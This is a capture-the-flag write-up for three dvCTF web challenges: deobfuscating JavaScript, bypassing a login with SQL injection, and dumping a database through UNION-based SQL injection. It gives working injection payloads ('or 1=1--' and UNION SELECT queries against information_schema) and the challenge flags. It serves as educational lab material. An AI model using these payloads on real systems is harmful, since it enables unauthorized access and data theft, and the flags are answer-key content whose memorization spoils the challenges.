# Web
## Obfuscated
For this challenge you need to deobfuscate given JavaScript. You can use some websites or do it yourself, because it's short. Deobfuscated script could look something like this:
```javascript
function testSecret() {
  var a = "%64%76%43%54%46%7b%31%74%5f%69%73%5f%6e%30%74%5f%34%5f%73%65%63%72%33%74%5f%34%6e%79%6d%30%72%33%7d"
  var s = document.getElementById("secret").value;
  if (s == unescape(a)) { // s == "dvCTF{1t_is_n0t_4_secr3t_4nym0r3}"
    document.getElementById("result").innerHtml =  "OOO NO you have found my secret !"
  } 
  else {
    document.getElementById("result").innerHtml =  "HEHE my secret is well kept !"
  }
```
`unescape()` is built in method and it decodes the flag:
```
dvCTF{1t_is_n0t_4_secr3t_4nym0r3}
```

## Authentication
We are presented with a login page we are supposed to bypass.
I've just tested the form for SQL injection by inputing `' or 1=1--` into username field and... it worked!
After looking around in the website I found the flag in the HTML source:
```
dvCTF{!th4t_w4s_34sy!}
```
## Members
SQL Injection, this time more serious.
We have a list of "memebers" with 3 columns and a search field.
I quickly found by testing that it's susceptible to SQL Injection. This time we need to use double quotes though.

 So we can use `UNION` to get everything we need:
 1. You can guess, or check with injections, how many columns does the table have. It has 3
 2. Use this input to show all the tables in the DB:
```SQL
" AND 1=2 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema = database() -- -
```
We get `members,supa_secret_table`

3. Check what columns `supa_secret_table` has:
```SQL
" AND 1=2 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema = database() AND table_name ='supa_secret_table'-- -
```
we get `id, flag`.

4. Finally we dump the contents of that table:
```SQL
" AND 1=2 UNION SELECT id, flag, 3 FROM supa_secret_table-- -
```
The injection payloads were adapted from [here](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635).

The flag:
```
dvCTF{1_h0p3_u_d1dnt_us3_sqlm4p}
```
